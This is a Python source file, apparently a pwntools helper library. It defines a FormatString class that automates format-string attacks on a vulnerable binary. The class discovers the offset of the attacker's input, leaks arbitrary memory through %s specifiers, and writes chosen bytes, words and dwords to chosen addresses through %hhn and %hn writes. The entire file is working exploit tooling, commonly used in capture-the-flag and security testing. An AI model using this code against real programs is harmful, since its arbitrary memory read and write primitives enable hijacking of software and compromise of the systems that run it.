from pwn import *

class FormatString:
    
    def __init__(self,exec_fmt,arch='i386',bits=32,endian='little',elf=None,maxExplore=64,badChars="\n"):
        """
        elf == pwnlib elf
        exec_fmt == function that takes in a string and returns the exact format string output from it
        badChars == string containing all the bad characters for this format string. For example, newline is often a bad char in format string attacks.
        """
        
        if type(exec_fmt) is not type(lambda x: x):
            log.error("exec_fmt arg must be a callable function.")
            return

        self.arch = arch
        self.bits = bits
        self.endian = endian
        self.elf = elf
        self.exec_fmt = exec_fmt
        self.maxExplore = maxExplore
        self.badChars = badChars

        # Might want to change this sometime...
        self.padChar = "C"
        
        # Where is our controlled buffer?
        self.pad = None
        self.index = None
        
        # The ELF will override the other options
        if elf is not None:
            if type(elf) is not pwnlib.elf.elf.ELF:
                log.warn("ELF argument is wrong type. Expecting pwnlib.elf, got {0}. Ignoring for now.".format(type(elf)))

            else:
                self.arch = elf.arch
                self.bits = elf.bits
                self.endian = elf.endian

        self.leak = memleak.MemLeak(self._leak)
        
        # Try to determine where we are in the binary
        self.explore()

    def explore(self):
        """
        Figure out where our input starts as well as other information automatically.
        """
        print("Exploring format string vulnerability...")

        discovered = False
        
        # How big should our search words be?
        wordSize = self.bits / 8

        # Change our output type based on the size we're looking for
        if self.bits == 32:
            outType = "x"
        elif self.bits == 64:
            outType = "lx"
        else:
            log.error("Unknown bits variety {0}".format(self.bits))
            return None
        
        # TODO: Might wanna change this later to something less predictable.
        testInput = "A"*wordSize
        padChar = self.padChar

        # Loop through up to the max exploration depth
        for index in range(1,self.maxExplore):

            # Check for pad offset
            for pad in range(wordSize):
                output = self.exec_fmt("{2}{0}%{3}$0{1}{4}".format(testInput,wordSize*2,padChar * pad,index,outType))
                outputHex = output.split(testInput)[1][:wordSize*2] # grab the hex

                # Check if we found it
                if unhexlify(outputHex)[::-1] == testInput:
                    discovered = True
                    break
            
            # Don't continue if we've found it
            if discovered:
                break

        if discovered:
            print("Found the offset to our input! Index = {0}, Pad = {1}".format(index,pad))
            self.index = index
            self.pad = pad

        else:
            log.warn("Failed to find offset to our input! You will have reduced functionality.")

    def _leak(self,addr):
        """
        Given an addr, leak that memory.
        """
        wordSize = self.bits / 8

        # Hand doing this for now due to not necessarily using pwntools...
        if self.bits == 32:
            if self.endian == 'little':
                addr = pack("<I",addr)
            else:
                addr = pack(">I",addr)
        elif self.bits == 64:
            if self.endian == 'little':
                addr = pack("<Q",addr)
            else:
                addr = pack(">Q",addr)
        else:
            log.error("Unable to leak address due to unknown bits size of {0}".format(self.bits))
            return None

        # Check for chars we don't like
        if self._hasBadChar(addr):
            return None
        
        # TODO: To simplify things, I give us generically 3 characters (upto index 999) to work with. This might not be desired in some cases. Maybe re-write this later to be more efficient

        # Real index takes into account that our own input is moving this around
        sLineSize = int(wordSize * round(float(6)/wordSize)) / wordSize
        realIndex = self.index + 2 + sLineSize
        sLine = "%{0}$s".format(str(realIndex).rjust(3,"0"))
        sLine = sLine + "J" * (wordSize - (len(sLine) % wordSize)) if (len(sLine) % wordSize) != 0 else sLine # Pad it out to a word length
        
        # TODO: Randomize guard?
        guard = "J"*wordSize

        # Put it together
        fmt = "{0}{1}{2}{4}{3}".format(self.padChar*self.pad,guard,sLine,addr,guard)
        #log.debug("Sending format string: {0}".format(fmt))
        out = self.exec_fmt(fmt)

        # If the leaker failed to return anything, we won't be able to do any more
        if out == None:
            return None
        
        # Split out the output
        out = out[out.index(guard) + len(guard):]
        out = out[:out.index(guard)]

        # Since we're printing strings, let's assume it's a null
        if out == "":
            out = "\x00"

        return out

    def _hasBadChar(self,s):
        # Just convert it
        if type(s) is int:
            h = hex(s)[2:]
            # Pad length
            if len(h) % 2 != 0:
                h = "0" + h

            s = unhexlify(h)

        # Check for chars we don't like
        for badChar in self.badChars:
            if badChar in s:
                return True

        return False

    def _packPointer(self,val):
        """Packs val as pointer relevant to the current binary"""
        assert type(self.bits) is int
        assert type(self.endian) is str

        if self.bits == 32:
            bits_str = "I"
        elif self.bits == 64:
            bits_str = "Q"
        else:
            log.error("Unknown bits value of {}".format(self.bits))
            return None

        if self.endian == 'little':
            endian_str = "<"
        elif self.endian == "big":
            endian_str = ">"
        else:
            log.error("Unknown endian type {}".format(self.endian))
            return None

        return pack("{0}{1}".format(endian_str,bits_str),val)


    def write_byte(self,addr,val):
        """Write only a single byte to the address specified"""
        
        assert type(val) in [int,str]
        assert type(addr) is int

        # Check for chars we don't like
        if self._hasBadChar(addr):
            return None
        
        # For later packing/unpacking
        endian_dir = "<" if self.endian is 'little' else ">"
        
        # For proper alignment
        pointer_len = self.bits/8
        
        # Change string to int
        if type(val) is str:
            if len(val) != 1:
                log.error("Write byte expects string of length 1, got length {0}".format(len(val)))
                return None

            # Change it to int
            val = unpack("{0}B".format(endian_dir),val)[0]

        elif val > 0xff:
            log.error("Attempting to write more than one byte. Use different write call.")
            return None

        # Print out appropriate number of chars
        fmt = "J"*self.pad
        if val - self.pad > 0:
            fmt += "%{0}c".format(str(val-self.pad))
        
        elif val - self.pad < 0:
            log.error("Pad value is larger than print value. Pick a larger value to write.")
            return None

        fmt += "%{0}$hhn"

        # TODO: Add check here that we can actually print this FEW. If pad > val we won't get this to work.

        # Round up to pointer length
        pad_after = ((int(math.ceil(len(fmt) / float(pointer_len))) * pointer_len) - len(fmt)) % pointer_len
        
        size = len(fmt) + pad_after
        
        assert size % pointer_len == 0
        
        # Adjust index
        index_updated = self.index + (size / pointer_len)

        fmt = fmt.format(str(index_updated).rjust(3,"0"))

        fmt = "{0}{1}{2}".format(
            fmt,
            "J"*pad_after,
            self._packPointer(addr)
            )

        self.exec_fmt(fmt)


    def write_word(self,addr,val):
        """write a words worth of data. val can be int or string"""

        assert type(val) in [int,str]
        assert type(addr) is int

        # Check for chars we don't like
        if self._hasBadChar(addr):
            return None
        
        endian_dir = "<" if self.endian is "little" else ">"

        pointer_len = self.bits/8

        if type(val) is str:
            if len(val) != 2:
                log.error("Write word expects string of length 2, got length {0}".format(len(val)))
                return None
            
            val = unpack("{0}H".format(endian_dir),val)[0]


        elif val > 0xffff:
            log.error("Input value is larger than word size (0xffff)")
            return None

        fmt = "J"*self.pad

        if val - self.pad > 0:
            fmt += "%{0}c".format(str(val-self.pad))

        elif val - self.pad < 0:
            log.error("Value to write is too low due to pad. Try a larger value.")
            return None

        fmt += "%{0}$hn"

        # Round up to pointer length
        pad_after = ((int(math.ceil(len(fmt) / float(pointer_len))) * pointer_len) - len(fmt)) % pointer_len

        size = len(fmt) + pad_after

        assert size % pointer_len == 0

        # Adjust index based on all these chars we just used
        index_updated = self.index + (size / pointer_len)

        fmt = fmt.format(str(index_updated).rjust(3,"0"))
        fmt = "{0}{1}{2}".format(
            fmt,
            "J"*pad_after,
            self._packPointer(addr)
            )

        self.exec_fmt(fmt)
        
    def write_dword(self,addr,val):

        assert type(val) in [int,str]
        assert type(addr) is int

        # Check for chars we don't like
        if self._hasBadChar(addr):
            return None

        endian_dir = "<" if self.endian is "little" else ">"

        pointer_len = self.bits/8

        if type(val) is str:
            if len(val) != 4:
                log.error("Write word expects string of length 4, got length {0}".format(len(val)))
                return None

            val = unpack("{0}I".format(endian_dir),val)[0]

        elif val > 0xffffffff:
            log.error("Input value is larger than dword size (0xffffffff)")
            return None

        # Split up the val into multiple word writes
        writes = []
        
        # Append first write
        writes.append({
            'val': val & 0xffff,
            'addr': addr
            })

        # Shift off part we just added
        val >>= 16
        addr += 2
        
        # Append second write
        writes.append({
            'val': val & 0xffff,
            'addr': addr
            })

        # Sort writes by value increasing
        writes = sorted(writes,key=lambda x: x['val'])

        # Add any initial pad
        fmt = "J"*self.pad

        # For each value we need to write, add it on to the format string
        cumulative = 0

        for write in writes:

            if write['val'] - cumulative > 0:
                fmt += "%{0}c".format(write['val'] - cumulative)

            if write['val'] - cumulative < 0:
                log.write("Ran into an impossible write apparently... :-/")
                return None

            fmt += "%{" + str(writes.index(write)) + "}$hn"
            cumulative += write['val']

        # Round up to pointer length
        pad_after = ((int(math.ceil(len(fmt) / float(pointer_len))) * pointer_len) - len(fmt)) % pointer_len

        size = len(fmt) + pad_after
        assert size % pointer_len == 0

        fmt += "J"*pad_after

        # Update our addr index
        index_updated = self.index + (size / pointer_len)

        # Going to dynamically build the pythong format args
        fmt_format = []

        # Tack on the addresses now
        for write in writes:
            fmt += self._packPointer(write['addr'])
            fmt_format.append(str(index_updated).rjust(3,"0"))
            index_updated += 1

        # Now add in our indexes
        fmt = fmt.format(*fmt_format)

        self.exec_fmt(fmt)

    def write_b(self,addr,val):
        return self.write_byte(addr,val)
        
    def write_w(self,addr,val):
        return self.write_word(addr,val)

    def write_d(self,addr,val):
        return self.write_dword(addr,val)

    def __getitem__(self,addr):
        """
        Get item is shorthand for leaking that memory location of the binary.
        """
        return self.leak(addr)
        

import logging
log = logging.getLogger('FormatString')
from binascii import unhexlify
from struct import pack, unpack
